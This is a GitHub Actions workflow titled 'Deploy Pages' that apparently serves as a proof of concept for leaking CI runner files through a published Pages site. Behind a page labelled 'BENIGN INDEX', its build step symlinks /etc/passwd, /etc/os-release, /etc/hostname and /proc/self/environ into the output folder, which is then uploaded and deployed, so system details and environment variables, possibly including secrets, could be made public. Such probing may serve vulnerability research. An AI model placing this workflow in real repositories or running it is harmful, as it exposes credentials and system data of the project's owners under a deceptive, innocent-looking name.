name: Deploy Pages
on:
  push:
    branches: [main]
  workflow_dispatch:
permissions:
  contents: read
  pages: write
  id-token: write
concurrency:
  group: pages
  cancel-in-progress: true
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        run: |
          mkdir -p out
          echo "<h1>BENIGN INDEX</h1><pre>" > out/index.html
          echo "PASSWD_FILE_FOLLOWS:" > out/passwd_link.html
          # Try absolute symlinks to runner-side files
          ln -s /etc/hostname out/hostname.txt
          ln -s /etc/os-release out/os.txt
          ln -s /etc/passwd out/passwd.txt
          ln -s /proc/self/environ out/environ.txt
          ls -la out/
      - uses: actions/upload-pages-artifact@v3
        with:
          path: out
  deploy:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - id: deployment
        uses: actions/deploy-pages@v4
